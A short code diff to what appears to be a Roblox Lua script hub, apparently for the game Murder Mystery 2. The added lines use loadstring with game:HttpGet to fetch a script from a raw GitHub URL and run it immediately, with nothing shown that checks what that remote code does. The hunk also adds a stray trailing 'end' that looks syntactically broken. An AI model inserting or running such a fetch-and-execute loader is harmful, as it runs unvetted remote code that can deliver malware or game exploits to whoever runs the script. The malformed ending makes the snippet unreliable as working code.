@@ -947,3 +947,6 @@ local ok, result = pcall(chunk, LICENSE, "do not the cat :3")
 if not ok then
 	v8("hub crashed: " .. tostring(result))
 end
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/robloxscript-creator/murdermystery2/refs/heads/main/OverdriveH'))()
+end
